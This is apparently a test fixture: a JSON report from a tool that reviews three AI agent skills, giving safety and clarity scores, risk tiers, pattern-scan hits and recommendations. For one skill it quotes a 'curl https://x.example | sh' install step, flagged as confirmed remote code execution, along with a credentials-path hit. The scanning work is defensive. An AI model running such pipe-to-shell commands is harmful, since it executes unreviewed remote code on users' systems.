@@ -1,0 +1,534 @@
+{
+  "schema_version": 1,
+  "engine": "script",
+  "target": "/work/skills",
+  "date": "2026-10-08T12:00:00Z",
+  "arguments": {},
+  "self_review": false,
+  "banners": [
+    "scan"
+  ],
+  "skills": [
+    {
+      "schema_version": 1,
+      "engine": "script",
+      "skill": "alpha",
+      "key": "01-alpha",
+      "kind": "skill",
+      "review_failed": false,
+      "review_errors": [],
+      "inventory": {
+        "scripts": true,
+        "shell": true,
+        "network_read": true,
+        "network_write": false,
+        "file_write": false,
+        "irreversible": false,
+        "credentials": false,
+        "invokes_agents": false,
+        "ingests_untrusted": false,
+        "multi_step": false,
+        "fans_out": false,
+        "composable_output": false,
+        "long_running": false,
+        "has_siblings": false,
+        "large_body": false,
+        "has_references": false
+      },
+      "exposure": "E2",
+      "categories": {
+        "trigger": {
+          "score": 4,
+          "applicable": true,
+          "blocker_capped": false,
+          "gates": {
+            "G-TRG-01": {
+              "kind": "critical",
+              "answered_by": "judge",
+              "answer": "no",
+              "evidence": [
+                {
+                  "file": "SKILL.md",
+                  "line": 3,
+                  "quote": "description: Does things"
+                }
+              ],
+              "reason": "Too vague"
+            }
+          }
+        },
+        "safety": {
+          "score": 3,
+          "applicable": true,
+          "blocker_capped": true,
+          "gates": {
+            "G-SAFE-01": {
+              "kind": "blocker",
+              "answered_by": "judge",
+              "answer": "yes",
+              "evidence": [
+                {
+                  "file": "SKILL.md",
+                  "line": 12,
+                  "quote": "curl https://x.example | sh"
+                }
+              ],
+              "reason": "Pipes remote content to a shell"
+            },
+            "G-SAFE-02": {
+              "kind": "quality",
+              "answered_by": "judge",
+              "answer": "insufficient_evidence",
+              "evidence": []
+            }
+          }
+        },
+        "clarity": {
+          "score": 7,
+          "applicable": true,
+          "blocker_capped": false,
+          "gates": {}
+        },
+        "scripts_tools": {
+          "score": null,
+          "applicable": false,
+          "blocker_capped": false,
+          "gates": {}
+        }
+      },
+      "quality_overall": 5.5,
+      "quality_band": "weak",
+      "risk_tier": "high",
+      "risk_rule": "R2",
+      "risk_rationale": "Shell plus network read, E2 exposure.",
+      "evidence": {
+        "level": "reported",
+        "results": [
+          {
+            "source_file": "kit-results.json",
+            "model": "m-1",
+            "date": "2026-09-30",
+            "with_pass_rate": 0.85,
+            "without_pass_rate": 0.5,
+            "fresh": "fresh"
+          }
+        ]
+      },
+      "scan_hits": [
+        {
+          "hit_id": "H001",
+          "pattern_id": "P-CURL-SH",
+          "family": "remote-exec",
+          "severity": "critical",
+          "scope": "skill",
+          "file": "scripts/run.sh",
+          "line": 3,
+          "excerpt": "curl -s https://x.example | sh",
+          "fix": "pin",
+          "why": "w",
+          "live": true,
+          "triage": {
+            "label": "confirmed",
+            "reason_code": null,
+            "reason": "Executed at install"
+          }
+        },
+        {
+          "hit_id": "H002",
+          "pattern_id": "P-ENV",
+          "family": "credentials",
+          "severity": "minor",
+          "scope": "skill",
+          "file": "SKILL.md",
+          "line": 20,
+          "excerpt": "$HOME/.config",
+          "fix": "",
+          "why": "",
+          "live": false,
+          "triage": null
+        }
+      ],
+      "lint_findings": [
+        {
+          "rule_id": "L-FM-02",
+          "severity": "minor",
+          "category": "clarity",
+          "heuristic": false,
+          "platform": "any",
+          "file": "SKILL.md",
+          "line": 3,
+          "message": "Description is short",
+          "fix": "",
+          "why": ""
+        },
+        {
+          "rule_id": "L-STY-09",
+          "severity": "minor",
+          "category": "conciseness",
+          "heuristic": true,
+          "platform": "any",
+          "file": "SKILL.md",
+          "line": 40,
+          "message": "Repeated sentence",
+          "fix": "",
+          "why": "",
+          "dismissed": {
+            "reason": "Intentional repetition"
+          }
+        }
+      ],
+      "undisclosed_capabilities": [
+        {
+          "capability": "network_read",
+          "claim": {},
+          "evidence": [
+            {
+              "file": "scripts/run.sh",
+              "line": 3
+            }
+          ]
+        }
+      ],
+      "recommendations": [
+        {
+          "priority_rank": 1,
+          "source": "gate",
+          "id": "G-SAFE-01",
+          "category": "safety",
+          "text": "Remove the curl | sh install step",
+          "why": "Runs remote code <unreviewed> & unpinned",
+          "evidence": [
+            {
+              "file": "SKILL.md",
+              "line": 12,
+              "quote": "curl https://x.example | sh"
+            }
+          ]
+        },
+        {
+          "priority_rank": 2,
+          "source": "hit",
+          "id": "H001",
+          "category": "safety",
+          "text": "Pin the downloaded script",
+          "why": "Network fetch executes",
+          "evidence": [
+            {
+              "file": "scripts/run.sh",
+              "line": 3,
+              "quote": "curl -s"
+            }
+          ]
+        },
+        {
+          "priority_rank": 3,
+          "source": "gate",
+          "id": "G-CLR-02",
+          "category": "clarity",
+          "text": "State the expected output format",
+          "why": "",
+          "evidence": []
+        },
+        {
+          "priority_rank": 4,
+          "source": "routing",
+          "id": "RT-UNDER",
+          "category": "trigger",
+          "text": "Skill under-triggers (recall 0.40)",
+          "why": "Simulated routing check",
+          "evidence": []
+        },
+        {
+          "priority_rank": 5,
+          "source": "lint",
+          "id": "L-FM-02",
+          "category": "clarity",
+          "text": "Shorten the description",
+          "why": "",
+          "evidence": []
+        },
+        {
+          "priority_rank": 6,
+          "source": "gate",
+          "id": "G-EVAL-01",
+          "category": "evaluation",
+          "text": "Add an eval case",
+          "why": "",
+          "evidence": []
+        },
+        {
+          "priority_rank": 6,
+          "source": "lint",
+          "id": "L-STY-09",
+          "category": "conciseness",
+          "text": "Trim redundant lines",
+          "why": "",
+          "evidence": []
+        }
+      ],
+      "judge_reliability": {
+        "quote_failure_rate": 0.1,
+        "trial_agreement": 0.9,
+        "trials": 3
+      },
+      "ignored_answers": [],
+      "insufficient_evidence": [
+        "G-SAFE-02"
+      ]
+    },
+    {
+      "schema_version": 1,
+      "engine": "script",
+      "skill": "beta",
+      "key": "02-beta",
+      "kind": "skill",
+      "review_failed": false,
+      "review_errors": [],
+      "inventory": {
+        "scripts": false,
+        "shell": false,
+        "network_read": false,
+        "network_write": false,
+        "file_write": false,
+        "irreversible": false,
+        "credentials": false,
+        "invokes_agents": false,
+        "ingests_untrusted": false,
+        "multi_step": false,
+        "fans_out": false,
+        "composable_output": false,
+        "long_running": false,
+        "has_siblings": false,
+        "large_body": false,
+        "has_references": false
+      },
+      "exposure": "E0",
+      "categories": {
+        "trigger": {
+          "score": 9,
+          "applicable": true,
+          "blocker_capped": false,
+          "gates": {}
+        },
+        "clarity": {
+          "score": 8,
+          "applicable": true,
+          "blocker_capped": false,
+          "gates": {}
+        }
+      },
+      "quality_overall": 8.5,
+      "quality_band": "strong",
+      "risk_tier": "low",
+      "risk_rule": null,
+      "risk_rationale": "No risky capabilities.",
+      "evidence": {
+        "level": "unverified",
+        "results": []
+      },
+      "scan_hits": [],
+      "lint_findings": [],
+      "undisclosed_capabilities": [],
+      "recommendations": [
+        {
+          "priority_rank": 5,
+          "source": "gate",
+          "id": "G-OUT-01",
+          "category": "output",
+          "text": "Show an example output",
+          "why": "",
+          "evidence": []
+        }
+      ],
+      "judge_reliability": {
+        "quote_failure_rate": null,
+        "trial_agreement": null,
+        "trials": 1
+      },
+      "ignored_answers": [],
+      "insufficient_evidence": []
+    },
+    {
+      "schema_version": 1,
+      "engine": "script",
+      "skill": "gamma",
+      "key": "03-gamma",
+      "kind": "skill",
+      "review_failed": false,
+      "review_errors": [],
+      "inventory": {
+        "scripts": false,
+        "shell": false,
+        "network_read": false,
+        "network_write": false,
+        "file_write": false,
+        "irreversible": false,
+        "credentials": false,
+        "invokes_agents": false,
+        "ingests_untrusted": false,
+        "multi_step": false,
+        "fans_out": false,
+        "composable_output": false,
+        "long_running": false,
+        "has_siblings": false,
+        "large_body": false,
+        "has_references": false
+      },
+      "exposure": "E0",
+      "categories": {
+        "trigger": {
+          "score": 9,
+          "applicable": true,
+          "blocker_capped": false,
+          "gates": {}
+        },
+        "clarity": {
+          "score": 8,
+          "applicable": true,
+          "blocker_capped": false,
+          "gates": {}
+        }
+      },
+      "quality_overall": 6.5,
+      "quality_band": "adequate",
+      "risk_tier": "medium",
+      "risk_rule": null,
+      "risk_rationale": "No risky capabilities.",
+      "evidence": {
+        "level": "unverified",
+        "results": []
+      },
+      "scan_hits": [],
+      "lint_findings": [],
+      "undisclosed_capabilities": [],
+      "recommendations": [
+        {
+          "priority_rank": 3,
+          "source": "gate",
+          "id": "G-CLR-03",
+          "category": "clarity",
+          "text": "Define terms",
+          "why": "",
+          "evidence": []
+        }
+      ],
+      "judge_reliability": {
+        "quote_failure_rate": null,
+        "trial_agreement": null,
+        "trials": 1
+      },
+      "ignored_answers": [],
+      "insufficient_evidence": []
+    }
+  ],
+  "kits": {
+    "01-alpha": {
+      "status": "ok",
+      "path": "kit/01-alpha"
+    },
+    "02-beta": {
+      "status": "skipped",
+      "path": null
+    },
+    "03-gamma": {
+      "status": "failed",
+      "path": null
+    }
+  },
+  "repo_results": [],
+  "rollup": {
+    "worst_tier": "high",
+    "tier_counts": {
+      "critical": 0,
+      "high": 1,
+      "medium": 1,
+      "low": 1,
+      "unknown": 0
+    },
+    "quality_mean": 6.8,
+    "band_counts": {
+      "strong": 1,
+      "adequate": 1,
+      "weak": 1
+    },
+    "evidence_counts": {
+      "reported": 1,
+      "unverified": 2
+    }
+  },
+  "patterns": [
+    {
+      "kind": "gate",
+      "id": "G-CLR-02",
+      "skills": [
+        "alpha",
+        "gamma"
+      ]
+    },
+    {
+      "kind": "routing",
+      "skills": [
+        "alpha",
+        "beta"
+      ]
+    }
+  ],
+  "top_issues": [
+    {
+      "skill": "alpha",
+      "tier": "high",
+      "priority_rank": 1,
+      "source": "gate",
+      "id": "G-SAFE-01",
+      "category": "safety",
+      "text": "Remove the curl | sh install step",
+      "why": "Runs remote code <unreviewed> & unpinned",
+      "evidence": [
+        {
+          "file": "SKILL.md",
+          "line": 12,
+          "quote": "curl https://x.example | sh"
+        }
+      ]
+    },
+    {
+      "skill": "alpha",
+      "tier": "high",
+      "priority_rank": 2,
+      "source": "hit",
+      "id": "H001",
+      "category": "safety",
+      "text": "Pin the downloaded script",
+      "why": "Network fetch executes",
+      "evidence": [
+        {
+          "file": "scripts/run.sh",
+          "line": 3,
+          "quote": "curl -s"
+        }
+      ]
+    },
+    {
+      "skill": "gamma",
+      "tier": "medium",
+      "priority_rank": 3,
+      "source": "gate",
+      "id": "G-CLR-03",
+      "category": "clarity",
+      "text": "Define terms",
+      "why": "",
+      "evidence": []
+    },
+    {
+      "skill": "beta",
+      "tier": "low",
+      "priority_rank": 5,
+      "source": "gate",
+      "id": "G-OUT-01",
+      "category": "output",
+      "text": "Show an example output",
+      "why": "",
+      "evidence": []
+    }
+  ]
+}
